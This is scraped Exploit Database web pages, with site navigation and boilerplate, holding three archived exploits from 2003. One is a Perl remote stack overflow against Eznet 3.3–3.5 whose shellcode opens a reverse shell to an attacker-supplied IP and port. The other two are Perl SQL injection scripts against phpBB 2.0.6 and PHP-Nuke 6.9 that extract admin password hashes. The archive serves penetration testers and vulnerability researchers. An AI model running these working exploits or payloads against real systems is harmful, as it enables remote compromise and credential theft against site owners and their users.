white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDEznet 3.5.0 - Remote Stack Overflow UniversalEDB-ID:136CVE:2003-1339EDB Verified:Author:kralorType:remoteExploit:/Platform:WindowsDate:2003-12-18Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl -w#########C###O###R###O###M###P###U###T###E###R############         [Crpt]  universal eZ v3.3 < v3.5 remote exploit by kralor  [Crpt]            ##----------------------------------------------------------------------------------------## versions tested & not vulnerables: v3.0 v3.1 v3.2			## versions tested & vulnerables: v3.3 v3.4 v3.5			## Cryptso.dll contains a 'static' jmp esp in eZnetwork pack from v3.3 to v3.5	## It is a trivial exploit, jumping to esp, then at esp we jump backward to           ## finally reach the shellcode. The shellcode gives a reverse remote shell.          ## Universal shellcode coded by kralor with the PEB technic.		#######W#W#W#.#C#O#R#O#M#P#U#T#E###R###.###N###E###T######use IO::Socket;print "\r\n\t   [Crpt] eZ v3.3 < v3.5 remote exploit by kralor [Crpt]\r\n";print "\t\twww.coromputer.net && undernet #coromputer\r\n\r\n";if(@ARGV<3||@ARGV>3) {print "syntax: ".$0." <victim> <your_ip> <your_port>\r\n";exit;}print "[+] Connecting to ".$ARGV[0]."\t...";my $sock = IO::Socket::INET->new(Proto=>'tcp',PeerAddr=>$ARGV[0],PeerPort=>"80");if(!$sock) {print "Error\r\n";exit;}print "Done\r\n";# 0xffe4	jmp  esp in Cryptso.dll (v3.3 v3.4 v3.5 @ 0x1004C72B)# 0xffffedffe9	jmp  back ($ - 4'608)$eip		= "\x2B\xC7\x04\x10";$jmp_back	= "\xE9\xFF\xED\xFF\xFF";# universal reverse remote shell using PEB, coded by kralor.$shellc0deI	= "\xeb\x02\xeb\x0f\x66\x81\xec\x04\x08\x8b\xec\x83\xec\x50\xe8\xef"."\xff\xff\xff\x5b\x80\xc3\x10\x33\xc9\x66\xb9\x9e\x01\x80\x33\x95"."\x43\xe2\xfa\x7e\xe6\xa6\x4e\x26\xa5\xf1\x1e\x96\x1e\xd5\x99\x1e"."\xdd\x99\x1e\x54\x1e\xc9\xb1\x9d\x1e\xe5\xa5\x96\xe1\xb1\x91\xad"."\x8b\xe0\xd9\x1e\xd5\x8d\x1e\xcd\xa9\x96\x4d\x1e\xce\xed\x96\x4d"."\x1e\xe6\x89\x96\x65\xc3\x1e\xe6\xb1\x96\x65\xc3\x1e\xc6\xb5\x96"."\x45\x1e\xce\x8d\xde\x1e\xa1\x0f\x96\x65\x96\xe1\xb1\x81\x1e\xa3"."\xae\xe1\xb1\x8d\xe1\x9f\xde\xb6\x4e\xe0\x7f\xcd\xcd\xa6\x55\x56"."\xca\xa6\x5c\xf3\x1e\x99\xca\xca\x1e\xa9\x1a\x18\x91\x92\x56\x1e"."\x8d\x1e\x56\xae\x54\xe0\x08\x56\xa6\x4e\xfd\xec\xd0\xed\xd4\xff"."\x9f\xff\xde\xc6\x7d\xe9\x6a\x6a\x6a\xa6\x5c\x52\xd0\x69\xe2\xe6"."\xa7\xca\xf3\x52\xd0\x95\xa6\xa7\x1d\xd8\x97\x1e\x48\xf3\x16\x7e"."\x91\xc4\xc4\xc6\x6a\x45\xa6\x4e\x1c\xd0\x91\xfd\xe7\xf0\xe6\xe6"."\xff\x9f\xff\xde\xc6\x7d\xde\x6a\x6a\x6a\x1e\xc8\x91\xa6\x6a\x52"."\xd0\x69\xc2\xc6\xd4\xc6\x52\xd0\x95\xfa\xf6\xfe\xf0\x1c\xe8\x91"."\xf3\x52\xd0\x91\xe1\xd4\x1e\x58\xf3\x16\x7c\x91\xc4\xc6\x6a\x45"."\xa6\x4e\xc6\xc6\xc6\xc6\xd6\xc6\xd6\xc6\x6a\x45\x1c\xd0\x31\xfd"."\xfb\xf0\xf6\xe1\xff\x96\xff\xc6\xff\x97\x7d\x93\x6a\x6a\x6a\xa6"."\x4e\x26\x97\x1e\x40\xf3\x1c\x8f\x96\x46\xf3\x52\x97";$shellc0deII	= "\xff\x85\xc0\x6a\xe0\x31\x6a\x45\xa6"."\x4e\xfd\xf0\xe6\xe6\xd4\xff\x9f\xff\xde\xc6\x7d\x40\x6b\x6a\x6a"."\xa6\x4e\x52\xd0\x39\xd1\x95\x95\x95\x1c\xc8\x25\x1c\xc8\x2d\x1c"."\xc8\x21\x1c\xc8\x29\x1c\xc8\x55\x1c\xc8\x51\x1c\xc8\x5d\x52\xd0"."\x4d\x94\x94\x95\x95\x1c\xc8\x49\x1c\xc8\x75\x1e\xc8\x31\x1c\xc8"."\x71\x1c\xc8\x7d\x1c\xc8\x79\xa6\x4e\x18\xd8\x65\xc4\x18\xd8\x39"."\xc4\xc6\xc6\xc6\xff\x94\xc6\xc6\xf3\x52\xd0\x69\xf6\xf8\xf3\x52"."\xd0\x6b\xf1\x95\x1d\xc8\x6a\x18\xc0\x69\xc7\xc6\x6a\x45\xa6\x4e"."\xfd\xed\xfc\xe1\xc5\xff\x94\xff\xde\xc6\x7d\xf3\x6b\x6a\x6a\x6a"."\x45\x95";my $tip		= inet_aton($ARGV[1]);my $paddr	= sockaddr_in($ARGV[2], $tip);$paddr=substr($paddr,2,6);$paddr=$paddr^"\x95\x95\x95\x95\x95\x95";my $rport=substr($paddr,0,2);my $rip=substr($paddr,2,4);$request	= "GET /SwEzModule.dll?operation=login&autologin="."\x90"x100 .$shellc0deI.$rport."\x96\x46\x52\x97".$rip.$shellc0deII."\x90"x4103 .$eip."\x90"x4 .$jmp_back." HTTP/1.0\r\n\r\n";print $sock $request;print "[+] Sending evil request\t...";close($sock);print "Done\r\n";exit;# milw0rm.com [2003-12-18]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 137
phpBB 2.0.6 - 'search_id' SQL Injection / MD5 Hash - PHP webapps Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDphpBB 2.0.6 - 'search_id' SQL Injection / MD5 HashEDB-ID:137CVE:2003-1216EDB Verified:Author:RusHType:webappsExploit:/Platform:PHPDate:2003-12-21Vulnerable App:Become a Certified Penetration TesterEnroll inAdvanced Web Attacks and Exploitation, the courserequired to become anOffensive Security Web Expert (OSWE)GET CERTIFIED#!/usr/bin/perl -wuse IO::Socket;##    PROOF-OF-CONCEPT##    * work only with mysql ver > 4.0##    * work only with post #1####    Example:##    C:\>r57phpbb-poc.pl 127.0.0.1 phpBB2 2 2##    [~] prepare to connect...##    [+] connected##    [~] prepare to send data...##    [+] OK##    [~] wait for response...##    [+] MD5 Hash for user with id=2 is: 5f4dcc3b5aa765d61d8327deb882cf99##if (@ARGV < 4){print "\n\n";print "|****************************************************************|\n";print " r57phpbb.pl\n";print " phpBB v<=2.06 search_id sql injection exploit (POC version)\n";print " by RusH security team // www.rsteam.ru , http://rst.void.ru\n";print " coded by f3sy1 & 1dt.w0lf // 16/12/2003\n";print " Usage: r57phpbb-poc.pl <server> <folder> <user_id> <search_id>\n";print " e.g.: r57phpbb-poc.pl 127.0.0.1 phpBB2 2 2\n";print " [~] <server> - server ip\n";print " [~] <folder> - forum folder\n";print " [~] <user_id> - user id (2 default for phpBB admin)\n";print " [~] <search_id> - play with this value for results\n";print "|****************************************************************|\n";print "\n\n";exit(1);}$success = 0;$server = $ARGV[0];$folder = $ARGV[1];$user_id = $ARGV[2];$search_id = $ARGV[3];print "[~] prepare to connect...\n";$socket = IO::Socket::INET->new(Proto => "tcp",PeerAddr => "$server",PeerPort => "80") || die "$socket error $!";print "[+] connected\n";print "[~] prepare to send data...\n";# PROOF-OF-CONCEPT reguest...print $socket "GET /$folder/search.php?search_id=$search_id%20union%20select%20concat(char(97,58,55,58,123,115,58,49,52,58,34,115,101,97,114,99,104,95,114,101,115,117,108,116,115,34,59,115,58,49,58,34,49,34,59,115,58,49,55,58,34,116,111,116,97,108,95,109,97,116,99,104,95,99,111,117,110,116,34,59,105,58,53,59,115,58,49,50,58,34,115,112,108,105,116,95,115,101,97,114,99,104,34,59,97,58,49,58,123,105,58,48,59,115,58,51,50,58,34),user_password,char(34,59,125,115,58,55,58,34,115,111,114,116,95,98,121,34,59,105,58,48,59,115,58,56,58,34,115,111,114,116,95,100,105,114,34,59,115,58,52,58,34,68,69,83,67,34,59,115,58,49,50,58,34,115,104,111,119,95,114,101,115,117,108,116,115,34,59,115,58,54,58,34,116,111,112,105,99,115,34,59,115,58,49,50,58,34,114,101,116,117,114,110,95,99,104,97,114,115,34,59,105,58,50,48,48,59,125))%20from%20phpbb_users%20where%20user_id=$user_id/*HTTP/1.0\r\n\r\n";print "[+] OK\n";print "[~] wait for response...\n";while ($answer = <$socket>){if ($answer =~ /;highlight=/){$success = 1;@result=split(/;/,$answer);@result2=split(/=/,$result[1]);$result2[1]=~s/&amp/ /g;print "[+] MD5 Hash for user with id=$user_id is: $result2[1]\n";}}if ($success==0) {print "[-] exploit failed =(\n";}## o---[ RusH security team | www.rsteam.ru | 2003 ]---o# milw0rm.com [2003-12-21]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 138
PHP-Nuke 6.9 - 'cid' SQL Injection - PHP webapps Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDPHP-Nuke 6.9 - 'cid' SQL InjectionEDB-ID:138CVE:EDB Verified:Author:RusHType:webappsExploit:/Platform:PHPDate:2003-12-21Vulnerable App:Become a Certified Penetration TesterEnroll inAdvanced Web Attacks and Exploitation, the courserequired to become anOffensive Security Web Expert (OSWE)GET CERTIFIED#!/usr/bin/perl -wuse IO::Socket;########################################## THIS CODE PUBLIC NOW  =)))        ############################################ __________               ___ ___   #### \______   \__ __  ______/   |   \  ####  |       _/  |  \/  ___/    _    \ ####  |    |   \  |  /\___ \\         / ####  |____|_  /____//____  >\___|_  /  ####         \/           \/       \/   ############################################ based on 'cid' sql injection vuln## in Download module, more info about## this vuln u can see here:## http://rst.void.ru/texts/advisory10.htm########################################## work only on mysql version > 4.0########################################## tested on PHP-Nuke versions: 6.9, 6.0, 6.5## C:\>r57phpnuke.pl 127.0.0.1 /phpnuke/ admin#### server : 127.0.0.1## folder : /phpnuke/## aid    : admin#### [~] prepare to connect...## [+] connected## [~] prepare to send data...## [+] success## [~] wait for reply...## [+] w00t...## [+] USER: admin## [+] MD5 HASH: 5f4dcc3b5aa765d61d8327deb882cf99##########################################if (@ARGV < 3){print "#############################################################\n";print " r57nuke-cid.pl - PHP-NUKE 'cid' sql injection exploit\n";print " by RusH security team // www.rsteam.ru , http://rst.void.ru\n";print " coded by 1dt.w0lf // r00t\@rsteam.ru // 17.09.2003\n";print "#############################################################\n";print " Usage:\n";print " r57nuke-cid.pl <host> </folder/> <aid>\n";print "\n";print " <host> - host for attack\n";print " </folder/> - PHP-nuke folder ( /phpnuke/ , /nuke/ or / for no folder )\n";print " <aid> - user aid , nick ( admin , blabla )\n";print "#############################################################";exit();}$server = $ARGV[0];$folder = $ARGV[1];$aid = $ARGV[2];print "\n";print "server : $server\n";print "folder : $folder\n";print "aid    : $aid\n";print "\n";$success = 0;$path_download = "modules.php?name=Downloads&d_op=viewdownload&cid=2%20UNION%20select%20counter,%20aid,%20pwd%20FROM%20nuke_authors%20--";$GET = $folder . $path_download;print "[~] prepare to connect...\n";$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$server", PeerPort => "80") ||die "[-] connect failed\n";print "[+] connected\n";print "[~] prepare to send data...\n";print $socket "GET $GET HTTP/1.1\n";print $socket "Host: $server\n";print $socket "Accept: */*\n";print $socket "Http-Referer: http://microsoft.com\n";print $socket "User-Agent: Internet Explorer 6.0\n";print $socket "Pragma: no-cache\n";print $socket "Cache-Control: no-cache\n";print $socket "Connection: close\n\n";print "[+] success\n";print "[~] wait for reply...\n";while ($answer = <$socket>){#print "$answer";if ($answer=~/(&amp;cid=)(\w)(\"><b>)($aid)(<\/b><\/a><\/font>)(.{0,20})(<font class=\"content\">)(.{32})(<\/font>)/){$success = 1;print "[+] w00t...\n";print "[+] USER: $1 \n[+] MD5 HASH: $6\n";}}if ($success == 0) { print "[-] exploit failed =(\n"; }# milw0rm.com [2003-12-21]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is 